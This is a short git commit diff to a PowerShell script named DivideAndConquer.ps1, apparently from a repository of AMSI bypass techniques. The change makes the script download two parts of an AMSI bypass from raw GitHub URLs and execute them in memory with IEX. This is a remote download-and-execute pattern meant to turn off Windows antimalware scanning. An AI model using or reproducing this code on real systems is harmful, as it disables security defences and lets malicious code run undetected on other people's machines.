abd49733c0f3c598e850dd5970987390e3d75621
74l4r14 <98590947+74l4r14@users.noreply.github.com>
2025-11-11 20:31:28 +0000

    Update DivideAndConquer.ps1

--- DivideAndConquer.ps1
+++ DivideAndConquer.ps1
@@ -1,7 +1,7 @@
 
 #grab the AMSI bypass code from github
 $block1 = (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/74l4r14/AMSI-Bypasses/refs/heads/main/amsiinitfail-dc1.ps1")
-$block2 = (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/74l4r14/AMSI-Bypasses/refs/heads/main/amsiinitfail-dc1.ps1")
+$block2 = (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/74l4r14/AMSI-Bypasses/refs/heads/main/amsiinitfail-dc2.ps1")
 
-$block1 $block2
-
+IEX $block1
+IEX $block2
